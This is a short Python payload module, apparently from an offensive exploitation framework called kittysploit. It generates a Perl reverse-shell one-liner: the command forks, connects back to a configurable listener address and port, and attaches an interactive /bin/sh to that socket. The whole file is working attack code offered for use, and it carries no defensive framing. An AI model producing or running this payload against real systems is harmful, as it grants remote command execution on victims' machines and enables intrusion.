from kittysploit import *


class Module(Payload):

    __info__ = {
        'name': 'Unix Command Shell, Reverse TCP (via Perl)',
        'description': 'Connect back and create a command shell via Perl IO::Socket',
        'category': PayloadCategory.CMD,
        'arch': Arch.PERL,
        'platform': Platform.UNIX,
        'listener': 'listeners/multi/reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL
    }

    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    shell_binary = OptString('/bin/sh', 'The system shell in use', True, True)
    perl_binary = OptString('perl', 'Perl binary', True)
    encoder = OptString('', 'Encoder', False, True)

    def generate(self):
        shell = str(self.shell_binary).replace("'", "'\"'\"'")
        return (
            f"{self.perl_binary} -MIO -e "
            f"'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{self.lhost}:{self.lport}\");"
            f"STDIN->fdopen($c,r);$~->fdopen($c,w);system q({shell} -i);'"
        )
